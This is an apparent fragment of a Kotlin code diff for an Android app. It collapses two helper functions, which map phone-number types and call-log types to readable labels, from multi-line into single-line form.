-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN -> "Company"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ISDN -> "ISDN"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX -> "Other Fax"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_RADIO -> "Radio"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TELEX -> "Telex"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD -> "TTY/TDD"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER -> "Work Pager"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT -> "Assistant"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MMS -> "MMS"
-            else -> "Custom: $type"
-        }
-    }
+    private fun getPhoneTypeLabel(type: Int): String { return when (type) { android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK -> "Callback"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CAR -> "Car"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN -> "Company"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ISDN -> "ISDN"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX -> "Other Fax"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_RADIO -> "Radio"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TELEX -> "Telex"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD -> "TTY/TDD"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER -> "Work Pager"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT -> "Assistant"; android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MMS -> "MMS"; else -> "Custom: $type" } }
     
-    private fun getCallTypeLabel(type: Int): String {
-        return when (type) {
-            CallLog.Calls.INCOMING_TYPE -> "Incoming"
-            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
-            CallLog.Calls.MISSED_TYPE -> "Missed"
-            CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
-            CallLog.Calls.REJECTED_TYPE -> "Rejected"
-            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
-            CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Answered Externally"
-            else -> "Unknown"
-        }
-    }
+    private fun getCallTypeLabel(type: Int): String { return when (type) { CallLog.Calls.INCOMING_TYPE -> "Incoming"; CallLog.Calls.OUTGOING_TYPE -> "Outgoing"; CallLog.Calls.MISSED_TYPE -> "Missed"; CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"; CallLog.Calls.REJECTED_TYPE -> "Rejected"; CallLog.Calls.BLOCKED_TYPE -> "Blocked"; CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Answered Externally"; else -> "Unknown" } }
 }
